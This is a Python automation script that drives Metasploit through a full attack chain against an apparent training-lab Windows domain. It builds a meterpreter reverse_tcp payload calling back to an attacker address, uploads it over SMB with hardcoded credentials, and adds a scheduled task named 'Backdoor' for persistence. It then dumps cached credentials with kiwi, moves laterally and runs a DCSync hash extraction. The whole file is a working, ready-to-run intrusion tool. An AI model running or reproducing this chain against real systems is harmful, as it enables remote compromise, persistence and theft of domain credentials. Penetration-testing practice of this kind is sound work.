#!/usr/bin/python3
import pexpect
import os

#Testing logging and script.after for reference. Attempt on laptop with faster external drives for hyper-v

print ("INITIALISING")
print ("WELCOME")

#msfvenom
process = pexpect.spawn('msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe') 
process.expect('Final')
print ("MSFVENOM SCRIPT COMPLETE. NAME=shell.exe")

# Start Metasploit
script = pexpect.spawn('msfconsole', encoding='utf-8')
fout = open('Metascript_logs.txt','wb')
script.logfile = fout

# Wait for Metasploit prompt
script.expect('msf6')
print ("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
print ("RUNNING WMIEXEC")
# Running resource1.rc
script.sendline('resource resource1.rc')
print (script.read)
script.expect('auxiliary', timeout=120)
print ("WMIEXEC COMPLETED - SUCCESS")
print (script.after)

print ("BEGINNING SMBCLIENT")
#SMB client put shell.exe
script.sendline('smbclient //172.22.117.20/C$ -U megacorpone/tstark')
script.expect('password')
print ("ENTERING PASSWORD")
script.sendline('Password!')
script.expect('smb')

print ("PUTTING SHELL.EXE")
print (script.after)

script.sendline('put shell.exe')
script.expect('smb')

print ("COMPLETE - EXITING")
print (script.after)

script.sendline('exit')
script.expect('auxiliary')

print ("SHELL.EXE SUCCESSFULLY PLACED - SMBCLIENT SUCCESS")
print (script.after)


print ("BEGINNING MULTI HANDLER")
# Running resource2.rc
script.sendline('resource resource2.rc')
script.expect_exact('meterpreter', timeout=999)

print ("RESOURCE 2 COMPLETED - ATTACK SUCCESS")
print (script.after)

print ("METERPRETER SHELL TO BACKGROUND")
script.sendline('background')
script.expect('auxiliary')

print ("BACKGROUND SUCCESS")
print (script.after)


print ("BEGINNING PERSISTENCE SERVICES")
# Running resource3.rc
script.sendline('resource resource3.rc')
script.expect('meterpreter', timeout=120)

print ("SUCCESS - REQUESTING SHELL")
print (script.after)

script.sendline('shell')
script.expect('C:\\ ', timeout=120)

print ("SHELL ESTABLISHED - CREATING SCHEDULED TASK")
print (script.after)

script.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
script.expect('C:\\ ')

print ("SCHEDULED TASK CREATED SUCCESSFULLY - EXITING")
print (script.after)

script.sendline('exit')
script.expect('meterpreter')

print (script.after)

script.sendline('exit')
script.expect('exploit')

print ("RESOURCE 3 COMPLETED - ATTACK SUCCESS")
print (script.after)


print (" BEGINNING PSEXEC")
# Running resource4.rc
script.sendline('resource resource4.rc')
script.expect('meterpreter')

print ("PSEXEC COMPLETED - ATTACK SUCCESS")
print (script.after)

print ("STARTING KIWI")
script.sendline('load kiwi')
script.expect('meterpreter')

script.sendline('kiwi_cmd lsadump::cache')
script.expect('meterpreter')

print ("CACHE DUMP SUCCESS - EXITING KIWI")
print (script.after)

script.sendline('exit')
script.expect('exploit')

print (script.after)


print ("STARTING LATERAL MOVEMENT")
# Running resource5.rc
script.sendline('resource resource5.rc')
script.expect('meterpreter')
print (script.after)

print ("REQUESTING SYSINFO")
script.sendline('sysinfo')
script.expect('meterpreter')
print (script.after)


print ("SUCCESS - ENTERING SHELL")
script.sendline('shell')
script.expect('system32')
print (script.after)


print ("SHELL ESTABLISHED - REQUESTING USERS")
script.sendline('net users')
script.expect('system32')
print ("USERS ESTABLISHED - EXITING - OPENING KIWI")
print (script.after)


script.sendline('exit')
script.expect('meterpreter')
script.sendline('load kiwi')
script.expect('meterpreter')
print (script.after)

print ("KIWI LOADED - TESTING DCSYNC")
script.sendline('dcsync_ntlm cdanvers')
script.expect('meterpreter')

print ("ATTACK SUCCESS - PROVEN VULNERABILITY - SHUTTING DOWN")


script.close()
